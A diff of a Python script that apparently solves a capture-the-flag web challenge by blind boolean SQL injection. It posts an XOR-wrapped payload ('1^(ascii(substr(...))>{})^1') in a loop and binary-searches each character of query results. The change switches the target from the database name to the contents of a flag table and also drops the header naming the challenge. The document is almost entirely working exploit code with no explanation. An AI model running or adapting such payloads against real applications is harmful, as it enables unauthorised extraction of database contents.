@@ -1,5 +1,3 @@
-# -*- coding: UTF-8 -*-
-# CISCN2019 华北赛区 Day2 Web1]Hack World
 
 import time
 
@@ -14,7 +12,7 @@ for x in range(1, 1000):
     high = 127
     mid = (low + high) // 2
     while low < high:
-        playload["id"] = "1^(ascii(substr((select(database())),{},1))>{})^1".format(x, mid)
+        playload["id"] = "1^(ascii(substr((select(group_concat(flag))from(f1ag_1s_h3r3_hhhhh)),{},1))>{})^1".format(x, mid)
         r = requests.post(url, data=playload)
         r.encoding = "utf-8"
         if r.text.find("Nu1L") != -1:
